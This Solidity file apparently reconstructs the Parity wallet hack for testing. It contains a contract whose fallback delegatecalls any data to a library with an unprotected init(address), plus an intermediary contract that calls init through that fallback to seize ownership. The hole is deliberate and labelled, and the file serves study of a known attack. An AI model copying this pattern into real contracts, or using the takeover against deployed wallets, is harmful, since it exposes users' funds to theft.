pragma solidity ^0.4.0;

/**********
 This is the base for a vulnerable contract as was HackParity.
 A contract, a library and a payable method that delegates call to the library any method that is not matched
 To use delegateCall, the library address must be hardcoded
***********/

contract TestLibrary {
    
    address public _owner;
    
    //Event called when reaching a function that is not called in any contract
    event reached();
    //Event called when changing Owner in init function
    event changingOwner(address);
    
    function init(address _from) public {
        changingOwner(_from);
        _owner = _from;
    }
    
    function canIReachThis() public {
       reached();
       //return true;
    }
}

contract VulnerableContract {
    
    //Event called when trying to Init the smart contract    
    event tryInit(address);

    //Ici mettre l'adresse de la librairie minée au préalable
    address constant _library = 0x5e72914535f202659083db3a02c984188fa26e9f;
    
    address public _owner;
    
    function formatFSig(string fSig) private returns (bytes4) {
        bytes32 result = keccak256(fSig);
        //Call byte4 pour tronquer le hash, sinon les params sont modifiés
        return bytes4(result);
    }
    
    //Constructor of the wallet. Delegates the initialisation of _owner to the library
    function VulnerableContract() public {
        tryInit(msg.sender);
        _library.delegatecall(formatFSig("init(address)"), msg.sender);
    }
    
    function getAddressLib() pure public returns (address) {
        return _library;    
    }
    
    // gets called when no other function matches
    function() payable public {
        //If I get sent some cash (wallet logic)
        if (msg.value > 0) {
            //Do something
        }
        else if (msg.data.length > 0) {
            //Delegate call to some library
            _library.delegatecall(msg.data);
        }
    }
}

/**********
 Intermediary created only for testing in solidity browser and the Javascript VM.
 Do not use in environments with blockchain running. For that use your console to send transactions.
***********/

contract intermediary {
    address constant _myContract = 0x1df11fca869524326dad2937ae8398e2296bda71;
    address public _owner;
    address ownerToTest = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
    
    function sendDataToPayable(string _data) public returns (bool) {
        if (keccak256(_data) == keccak256("init(address)")) {
                return _myContract.call(bytes4(keccak256(_data)), ownerToTest);
        } else {
                return _myContract.call(keccak256(_data));
        }
    }
}
